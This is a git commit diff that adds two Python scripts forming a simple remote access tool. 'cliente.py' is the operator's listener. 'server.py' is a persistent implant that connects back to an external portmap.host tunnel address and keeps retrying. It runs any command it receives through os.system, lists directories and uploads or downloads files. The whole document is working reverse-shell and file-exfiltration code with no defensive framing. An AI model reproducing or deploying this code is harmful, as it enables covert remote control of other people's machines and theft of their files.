7694c0ba4b84dcfff9fd4af37f0649af0fa458dd
mrrockyy <camilo.fonsecacat@gmail.com>
2022-04-06 20:46:29 -0500

    comit

---
+++ cliente.py
@@ -0,0 +1,74 @@
+import os
+import time
+
+import struct
+import socket
+host = "10.9.147.126"
+port = 4894
+
+
+def send_file(conn, filename):
+      filesize = os.path.getsize(filename)
+      conn.send(struct.pack("<Q", filesize))
+
+      with open(filename, "rb") as f:
+            while read_bytes := f.read(1024):
+              conn.send(read_bytes)
+
+def receive_file_size(sck: socket.socket):
+    fmt = "<Q"
+    expected_bytes = struct.calcsize(fmt)
+    received_bytes = 0
+    stream = bytes()
+    while received_bytes < expected_bytes:
+        chunk = sck.recv(expected_bytes - received_bytes)
+        stream += chunk
+        received_bytes += len(chunk)
+    filesize = struct.unpack(fmt, stream)[0]
+    return filesize
+
+
+def receive_file(sck: socket.socket, filename):
+    filesize = receive_file_size(sck)
+    with open(filename, "wb") as f:
+        received_bytes = 0
+        while received_bytes < filesize:
+            chunk = sck.recv(1024)
+            if chunk:
+                f.write(chunk)
+                received_bytes += len(chunk)
+
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+print ("Socket Created")
+sock.bind((host, port))
+print ("socket bind complete")
+sock.listen(1)
+conn, addr = sock.accept() 
+print('Conexión con {}.'.format(addr))
+
+ruta=conn.recv(4096).decode("UTF-8")
+while True:
+    time.sleep(1)
+    orden=input(f"{ruta} ")
+    if orden == "":
+        conn.send("null".encode("UTF-8"))
+        print("command no found ")
+    else:
+        conn.send(orden.encode("UTF-8"))
+    if orden.split(" ")[0] == "ls":
+      data= conn.recv(4096).decode("UTF-8")
+      print(data)
+    elif orden.split(" ")[0]== "download": 
+         receive_file(conn,orden.split(" ")[2])
+    elif orden.split(" ")[0]== "upload":
+        try:
+         send_file(conn,orden.split(" ")[1])
+        except:
+          break
+    elif orden == "exit":
+        break
+    ruta=conn.recv(4096).decode("UTF-8")
+
+
+
---
+++ server.py
@@ -0,0 +1,85 @@
+import socket
+import os
+import time
+import struct
+
+
+host = 'coookiesamcream32-63591.portmap.host'
+port = 63591
+
+
+
+def receive_file_size(sck: socket.socket):
+        fmt = "<Q"
+        expected_bytes = struct.calcsize(fmt)
+        received_bytes = 0
+        stream = bytes()
+        while received_bytes < expected_bytes:
+            chunk = sck.recv(expected_bytes - received_bytes)
+            stream += chunk
+            received_bytes += len(chunk)
+        filesize = struct.unpack(fmt, stream)[0]
+        return filesize
+
+def receive_file(sck: socket.socket, filename):
+        filesize = receive_file_size(sck)
+        with open(filename, "wb") as f:
+            received_bytes = 0
+            while received_bytes < filesize:
+                chunk = sck.recv(1024)
+                if chunk:
+                     f.write(chunk)
+                     received_bytes += len(chunk)
+
+
+
+def send_file(s, filename):
+    filesize = os.path.getsize(filename)
+    s.send(struct.pack("<Q", filesize))
+    with open(filename, "rb") as f:
+        while read_bytes := f.read(1024):
+            s.send(read_bytes)
+while True:
+ while True:
+  with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+   try:
+    s.connect((host, port))
+   except ConnectionRefusedError:
+    time.sleep(40)
+    break
+
+   ruta=os.getcwd()
+   s.send(ruta.encode("UTF-8"))
+
+   while True:
+    try:
+     orden = s.recv(4096).decode("UTF-8")
+     print(orden)
+     if orden == "ls":
+        ls=str(os.listdir())
+        s.send(ls.encode("UTF-8"))
+     elif orden.split(" ")[0] == "cd":
+        try:
+          os.chdir(orden.split(" ")[1]) 
+        except FileNotFoundError:
+            pass
+     elif orden.split(" ")[0] == "download":
+        send_file(s,orden.split(" ")[1])
+     elif orden.split(" ")[0] == "upload":
+        receive_file(s,orden.split(" ")[2])
+     elif orden == "exit":
+        s.close()
+        break
+     else:
+         os.system(orden)
+         time.sleep(10)
+
+
+
+     time.sleep(0.5)
+     ruta=os.getcwd()
+     s.send(ruta.encode("UTF-8"))
+    except (BrokenPipeError,FileNotFoundError ):
+       s.close()
+       time.sleep(5)
+       break
